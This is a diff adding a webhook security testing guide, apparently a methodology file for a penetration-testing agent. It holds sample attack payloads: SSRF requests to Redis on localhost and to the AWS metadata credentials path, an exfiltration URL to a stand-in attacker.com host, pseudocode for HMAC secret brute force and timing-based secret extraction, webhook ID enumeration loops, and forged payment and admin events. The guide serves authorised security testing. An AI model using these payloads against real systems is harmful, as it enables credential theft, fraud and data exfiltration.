@@ -1,0 +1,194 @@
+<webhook_security_guide>
+<title>WEBHOOK SECURITY</title>
+
+<critical>Webhooks enable server-to-server notifications but introduce SSRF, signature bypass, replay attacks, and timing vulnerabilities. Test signature validation, SSRF via webhook URLs, replay protection, timing attacks, URL enumeration, event injection, and callback manipulation.</critical>
+
+<scope>
+- Signature validation bypass (HMAC, JWT)
+- SSRF via webhook URLs
+- Replay attacks (nonce, timestamp validation)
+- Timing attacks on signature verification
+- Webhook URL enumeration
+- Event injection and manipulation
+- Callback URL parameter abuse
+- Rate limiting and DoS
+</scope>
+
+<methodology>
+1. Register webhook: capture signature generation method
+2. Test signature: bypass HMAC, JWT validation
+3. Test SSRF: point webhook to internal/cloud metadata
+4. Test replay: reuse old webhook payloads
+5. Test timing: measure signature verification time
+6. Test injection: manipulate event types, data
+7. Test enumeration: discover other webhook URLs
+8. Test rate limits: flood webhooks
+</methodology>
+
+<signature_bypass>
+<missing_validation>
+POST /webhook/callback
+X-Signature: anything
+{"event": "payment.success"}
+→ If processes without validation: vulnerable
+</missing_validation>
+
+<weak_secrets>
+- Hardcoded: secret123, webhook_secret
+- Predictable: MD5(domain), company_name
+- Dictionary attack on HMAC
+
+Brute force:
+for secret in wordlist:
+    sig = hmac.new(secret.encode(), body, 'sha256').hexdigest()
+    if sig == received_signature:
+        print(f"Found secret: {secret}")
+</weak_secrets>
+
+<algorithm_confusion>
+- Expected: HMAC-SHA256
+- Send: HMAC-SHA1, none, JWT
+- Signature: JWT signed with HS256 using public key
+
+X-Signature: jwt_token_with_weak_sig
+</algorithm_confusion>
+
+<timing_attacks>
+- Compare signatures byte-by-byte (non-constant time)
+- Leak secret via timing differences
+
+for char in charset:
+    time = measure('/webhook', sig=secret_prefix + char)
+    if time > baseline:
+        secret_prefix += char  # correct char takes longer
+</timing_attacks>
+</signature_bypass>
+
+<ssrf_via_webhook>
+<internal_targets>
+POST /webhooks
+{
+    "url": "http://127.0.0.1:6379/",  # Redis
+    "event": "user.created"
+}
+
+Trigger event → webhook fires to internal service
+</internal_targets>
+
+<cloud_metadata>
+POST /webhooks
+{
+    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+}
+→ Webhook sends to AWS metadata, exfiltrates in response logs
+</cloud_metadata>
+
+<data_exfiltration>
+POST /webhooks
+{
+    "url": "http://attacker.com/log?data={user.email}"
+}
+→ Webhook sends sensitive data to attacker
+</data_exfiltration>
+</ssrf_via_webhook>
+
+<replay_attacks>
+<no_nonce>
+- Capture webhook payload
+- Resend later → processed again
+- Duplicate transactions, events
+
+Captured:
+POST /webhook
+X-Signature: valid_sig
+X-Timestamp: 1234567890
+{"event": "payment", "amount": 100}
+
+Replay → payment processed twice
+</no_nonce>
+
+<weak_timestamp>
+- Timestamp validation: accept ±5 minutes
+- Capture and replay within window
+
+Check:
+if abs(now - timestamp) < 300:  # 5 minutes
+    process()  # replayable for 10 minute window
+</weak_timestamp>
+</replay_attacks>
+
+<event_injection>
+<unauthorized_events>
+POST /webhook/callback
+{
+    "event": "admin.privilege.granted",
+    "user_id": "attacker"
+}
+→ If signature bypassed: inject privileged events
+</unauthorized_events>
+
+<parameter_tampering>
+{
+    "event": "payment.success",
+    "user_id": 123,
+    "amount": 1000,  # changed from 10
+    "currency": "USD"
+}
+→ Modify payment amount, user ID, status
+</parameter_tampering>
+</event_injection>
+
+<url_enumeration>
+<webhook_ids>
+- /webhooks/123 → /webhooks/124, 125, 126
+- Enumerate all webhook endpoints
+- Discover other customers' webhooks
+
+for id in range(1, 10000):
+    GET f"/webhooks/{id}"
+    if status == 200:
+        print(f"Found webhook: {id}")
+</webhook_ids>
+
+<predictable_urls>
+- /webhook/{md5(email)}
+- /webhook/{company_name}
+- Guess and trigger
+
+Test common: /webhook/test, /webhook/default, /webhook/admin
+</predictable_urls>
+</url_enumeration>
+
+<validation>
+1. Test signature: remove, modify, use weak secrets
+2. Test SSRF: register webhook to internal/metadata URLs
+3. Test replay: capture and resend old payloads
+4. Test injection: manipulate event types and data
+5. Test timing: measure signature verification time differences
+6. Demonstrate impact: unauthorized access, SSRF, duplicate events
+</validation>
+
+<impact>
+- SSRF to internal services, cloud metadata
+- Signature bypass → unauthorized event injection
+- Replay attacks → duplicate transactions
+- Timing attacks → secret extraction
+- Event injection → privilege escalation
+- Data exfiltration via webhook URLs
+</impact>
+
+<pro_tips>
+1. Test with localhost, 127.0.0.1, metadata IPs first
+2. Capture webhook payloads for replay testing
+3. Check for constant-time signature comparison
+4. Test all event types for injection vulnerabilities
+5. Enumerate webhook IDs sequentially
+6. Check rate limits per webhook vs global
+7. Test with various HTTP methods (not just POST)
+8. Look for webhook secrets in JavaScript, documentation
+9. Test callback URL parameter injection
+10. Check for webhook deletion/modification without auth
+</pro_tips>
+
+<remember>Secure webhooks require: strong signature validation (HMAC-SHA256 with high-entropy secret), constant-time comparison, replay protection (nonce + timestamp), webhook URL validation (no SSRF), authorization on webhook management, and event type validation.</remember>
+</webhook_security_guide>
